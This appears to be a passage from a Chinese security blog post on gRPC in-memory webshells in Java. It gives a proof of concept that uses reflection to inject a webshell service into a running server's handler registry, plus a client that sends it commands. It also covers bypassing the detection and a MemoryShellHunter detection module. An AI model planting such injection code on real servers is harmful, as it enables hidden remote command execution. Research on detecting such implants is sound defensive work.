        this.executorPool = (ObjectPool)Preconditions.checkNotNull(builder.executorPool, "executorPool");
        this.registry = (HandlerRegistry)Preconditions.checkNotNull(builder.registryBuilder.build(), "registryBuilder");
        ...
    }
主要是关注builder.registryBuilder.build()方法，进入的正好是io.grpc.internal.InternalHandlerRegistry$Builder类的build方法。
    static final class Builder {
        private final HashMap services = new LinkedHashMap();
        Builder() {
        }
        InternalHandlerRegistry.Builder addService(ServerServiceDefinition service) {
            this.services.put(service.getServiceDescriptor().getName(), service);
            return this;
        }
        InternalHandlerRegistry build() {
            Map> map = new HashMap();
            Iterator var2 = this.services.values().iterator();
            while(var2.hasNext()) {
                ServerServiceDefinition service = (ServerServiceDefinition)var2.next();
                Iterator var4 = service.getMethods().iterator();
                while(var4.hasNext()) {
                    ServerMethodDefinition method = (ServerMethodDefinition)var4.next();
                    map.put(method.getMethodDescriptor().getFullMethodName(), method);
                }
            }
            return new InternalHandlerRegistry(Collections.unmodifiableList(new ArrayList(this.services.values())), Collections.unmodifiableMap(map));
        }
    }
最后返回的Collections.unmodifiableList和Collections.unmodifiableMap，就是将list列表和map转换成无法修改的对象，因此注册的UserServiceImpl对象中的方法从一开始就确定了。
至此，内存马的实现步骤就可以得知，需要通过反射重新定义ServerImpl对象中的this.registry值，添加进我们内存马的ServerServiceDefinition和ServerMethodDefinition。
### 内存马注入
由于M01N Team公众号中并未直接给出poc利用，这里我也只能凭借自己的想法慢慢复现。
由于需用反射替换掉原先被设置unmodifiable的ServerServiceDefinition和ServerMethodDefinition，因此就需要ServerImpl对象的句柄。
由于ServerImpl并不是静态的类，需要获取的字段也不是静态的，因此要获取到JVM中ServerImpl的类，可目前为止我没有想到有什么很好的方式获取。如果读者们有更好的思路可以留言给我，欢迎相互讨论学习。
注入的思路，就是先获取ServerImpl中已经有的ServerServiceDefinition和ServerMethodDefinition，读取到新的List和Map中，并在新的List和Map中添加WebShell内存马的信息，最后再设置unmodifiable属性并更改registry对象的值。
Poc如下所示，需要提供ServerImpl对象的实例。
    public static void changeGRPCService(Server server){
        try {
            Field field = server.getClass().getDeclaredField("registry");
            field.setAccessible(true);
            Object registry = field.get(server);
            Class handler = Class.forName("io.grpc.internal.InternalHandlerRegistry");
            Field services = handler.getDeclaredField("services");
            services.setAccessible(true);
            List servicesList = (List) services.get(registry);
            List newServicesList = new ArrayList(servicesList);
            //调用WebShell的bindService
            Class cls = Class.forName("com.demo.shell.protocol.WebShellServiceGrpc$WebShellServiceImplBase");
            Method m = cls.getDeclaredMethod("bindService");
            BindableService obj = new WebshellServiceImpl();
            ServerServiceDefinition service = (ServerServiceDefinition) m.invoke(obj);
            newServicesList.add(service);       //添加新的Service到List中
            services.set(registry, Collections.unmodifiableList(newServicesList));
            Field methods = handler.getDeclaredField("methods");
            methods.setAccessible(true);
            Map methodsMap = (Map) methods.get(registry);
            Map newMethodsMap = new HashMap(methodsMap);
            for (ServerMethodDefinition serverMethodDefinition : service.getMethods()) {
                newMethodsMap.put(serverMethodDefinition.getMethodDescriptor().getFullMethodName(), serverMethodDefinition);
            }
            methods.set(registry,Collections.unmodifiableMap(newMethodsMap));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
上面的代码片段只是一个demo版本，具体的实现需要把WebShellServiceGrpc类转成字节码，再Definition到JVM中。
注入完成后，在客户端执行如下代码调用即可：
    package com.demo.shell.test;
    import com.demo.shell.protocol.WebShellServiceGrpc;
    import com.demo.shell.protocol.Webshell;
    import io.grpc.ManagedChannel;
    import io.grpc.ManagedChannelBuilder;
    /**
     * @author demo
     * @date 2022/11/27
     */
    public class NsTestShell {
        public static void main(String[] args) {
            Webshell webshell = Webshell.newBuilder()
                    .setPwd("x")
                    .setCmd("calc")
                    .build();
            String host = "127.0.0.1";
            int port = 8082;
            ManagedChannel channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();
            WebShellServiceGrpc.WebShellServiceBlockingStub webShellServiceBlockingStub = WebShellServiceGrpc.newBlockingStub(channel);
            Webshell s = webShellServiceBlockingStub.exec(webshell);
            System.out.println(s.getCmd());
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            channel.shutdown();
        }
    }
而原本公众号中给出的防御方式是通过RASP技术对动态修改Service对象的行为做出拦截。其实我个人觉得这里不太好埋点，比如我可以对Service的上层对象registry直接做修改，或者我对Services对象的某个ServerServiceDefinition做修改，不做添加而只是修改原来已经存在的Method，操作的对象就不需要再更改Services的值。
### gRPC内存马查杀
我在原先编写的内存马查杀工具MemoryShellHunter添加检测模块：
首先在Agent中的transform方法中用ASM消费所有的类
    ClassReader reader = new ClassReader(bytes);
    ClassWriter writer = new ClassWriter(reader, 0);
    GrpcClassVisitor visitor = new GrpcClassVisitor(writer,Grpc_Methods_list);
    reader.accept(visitor, 0);
这里的GrpcClassVisitor就是当前类的父类的接口是否继承自io.grpc.BindableService，如果是，则说明这是一个gRPC实现类，因此当中定义的方法都可以是危险函数，需要进一步使用可达性分析判断是否有危险Sink函数。
    package com.websocket.findMemShell;
    import java.util.List;
    import org.objectweb.asm.ClassVisitor;
    import org.objectweb.asm.ClassWriter;
    import org.objectweb.asm.MethodVisitor;
    import org.objectweb.asm.Opcodes;
    public class GrpcClassVisitor extends ClassVisitor {
        private String ClassName = null;
        private List Grpc_Methods_list;
        public GrpcClassVisitor(ClassWriter writer,List Grpc_Methods_list) {
            super(Opcodes.ASM4, writer);
            this.Grpc_Methods_list = Grpc_Methods_list;
        }
        @Override
        public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
            if(superName.contains("ServiceGrpc")) {
                try {
                    String cls = Thread.currentThread().getContextClassLoader().loadClass(superName.replaceAll("/", "\\.")).getInterfaces()[0].getName();
                    if(cls.equals("io.grpc.BindableService")) {
                        //System.out.println("SuperName Class:"+cls);
                        this.ClassName = name;
                    }
                } catch (ClassNotFoundException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
            super.visit(version, access, name, signature, superName, interfaces);
        }
        @Override
        public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
            MethodVisitor methodVisitor = cv.visitMethod(access, name, desc, signature, exceptions);
            if(this.ClassName == null) {
                return methodVisitor;
            }else {
                return new MyMethodVisitor(methodVisitor, access, name, desc,this.ClassName,this.Grpc_Methods_list);
            }
        }
        class MyMethodVisitor extends MethodVisitor implements Opcodes {
            private String MethodName;
            private String ClassName;
            private List Grpc_Methods_list;
            public MyMethodVisitor(MethodVisitor mv, final int access, final String name, final String desc,String ClassName,List Grpc_Methods_list) {
                super(Opcodes.ASM5, mv);
                this.MethodName = name;
                this.ClassName = ClassName;
                this.Grpc_Methods_list = Grpc_Methods_list;
            }
            @Override
            public void visitMethodInsn(final int opcode, final String owner,
                    final String name, final String desc, final boolean itf) {
                if(!this.Grpc_Methods_list.contains(this.ClassName+"#"+this.MethodName)) {
                    this.Grpc_Methods_list.add(this.ClassName+"#"+this.MethodName);
                    //System.out.println(this.ClassName+"#"+this.MethodName);
                }
                super.visitMethodInsn(opcode, owner, name, desc, itf);
            }
        }
    }
判断函数逻辑：
    if(discoveredCalls.containsKey(cp.getClassName().replaceAll("\\.", "/"))) {
        List list = discoveredCalls.get(cp.getClassName().replaceAll("\\.", "/"));
        for(String str : list) {
            if(dfsSearchSink(str)) {
                stack.push(str);
                stack.push(cp.getClassName().replaceAll("\\.", "/"));
                StringBuilder sb = new StringBuilder();
                while(!stack.empty()) {
                    sb.append("->");
                    sb.append(stack.pop());
                }
                System.out.println("Controller CallEdge: "+sb.toString());
                break;
            }
        }
    }
这样的好处可以查找出系统中gRPC的内存马。
缺点是在查找gRPC实现类的时候，需要用到当前线程的ClassLoader判断父类是否继承自io.grpc.BindableService，因此攻击的时候只需要更改加载的ClassLoader即可绕过。
这里也是抛砖引玉，如果有更好的检测思路和查杀思路欢迎提交pr：
### Reference
[1].
[2].
[3].
[4].